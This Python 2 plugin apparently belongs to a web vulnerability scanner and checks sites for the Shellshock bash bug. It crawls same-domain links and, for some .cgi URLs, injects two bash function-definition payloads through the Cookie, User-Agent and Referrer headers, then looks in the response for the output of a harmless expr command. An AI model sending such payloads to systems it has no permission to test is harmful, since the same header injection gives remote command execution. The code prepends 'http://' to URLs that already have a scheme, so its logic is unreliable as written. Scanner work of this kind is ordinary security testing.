#!/usr/bin/python
# -*- coding: utf-8 -*-

import HTMLParser
import urlparse

from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def get_url(domain, timeout):
    url_list = []
    res = urllib2.urlopen('http://' + domain, timeout=timeout)
    html = res.read()
    root_url = res.geturl()
    m = re.findall("<a[^>]*?href=('|\")(.*?)\\1", html, re.I)
    if m:
        for url in m:
            ParseResult = urlparse.urlparse(url[1])
            if ParseResult.netloc and ParseResult.scheme:
                if domain == ParseResult.hostname:
                    url_list.append(HTMLParser.HTMLParser().unescape(url[1]))
            elif not ParseResult.netloc and not ParseResult.scheme:
                url_list.append(HTMLParser.HTMLParser().unescape(urlparse.urljoin(root_url, url[1])))
    return list(set(url_list))


def run_domain(http, ob):
    try:
        result = []
        scheme = ob['scheme']
        domain = ob['domain']
        path = ob['path']
        ip = ob['ip']
        source_ip = ob.get('source_ip')
        url_list = get_url(domain, 8)
        shell_list = ['() { :; }; /bin/expr 32001611 - 100', '{() { _; } >_[$($())] { /bin/expr 32001611 - 100; }}']
        i = 0
        for url in url_list:
            url_parse = urlparse.urlparse(url)
            scheme = url_parse.scheme
            netloc = url_parse.netloc
            path = url_parse.path
            query = url_parse.query

            if source_ip:
                netloc = source_ip
            if query:
                url = "%s://%s%s?%s" % (scheme, netloc, path, query)
            else:
                url = "%s://%s%s" % (scheme, netloc, path)
            if '.cgi' in url:
                i += 1
                if i >= 4: return
                for shell in shell_list:
                    header = {'cookie': shell, 'User-Agent': shell, 'Referrer': shell, 'Host': domain}
                    try:
                        request = urllib2.Request('http://' + url, headers=header)
                        res_html = urllib2.urlopen(request).read()
                    except urllib2.HTTPError, e:
                        res_html = e.read()
                    if "32001511" in res_html:
                        detail = u'shellshock命令执行漏洞'
                        new_url = 'http://' + url
                        request = getRequest(new_url, domain=ob['domain'])
                        result.append(getRecord(ob, new_url, ob['level'], detail, request, res_html))

    except Exception, e:
        logger.error("File:web_shellshock_domain.py, run_domain function :%s" % (str(e)))

    return result
